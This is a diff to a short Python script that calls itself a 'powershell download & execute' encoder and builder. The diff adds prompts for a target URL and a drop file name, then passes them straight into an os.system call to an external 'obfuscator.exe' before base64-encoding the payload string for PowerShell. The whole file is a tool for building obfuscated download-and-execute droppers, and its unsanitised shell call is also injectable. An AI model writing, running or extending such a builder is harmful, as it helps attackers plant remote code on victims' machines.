@@ -1,4 +1,5 @@
 import base64
+import os
 
 print('## powershell download & execute , Encoder + Builder        ##')
 print('## Note: This is not a normal base64 encoder!               ##')
@@ -6,7 +7,10 @@ print('## It converts the string to UTF-16LE first before encoding ##')
 print('## as that is what PowerShell expects!                      ##')
 print('')
 
-code = raw_input('INVOKEN STRING TO ENCODE: ')
+target = raw_input('ENTER TARGET URL: ')
+dropname = raw_input('ENTER DROP NAME: ')
+os.system("obfuscator.exe " + target + " " + dropname)
+code = raw_input('INVOKEN STRING TO ENCODE (Control + V): ')
 print('')
 shellcode = base64.b64encode(code.encode('UTF-16-LE'))
 print (shellcode)
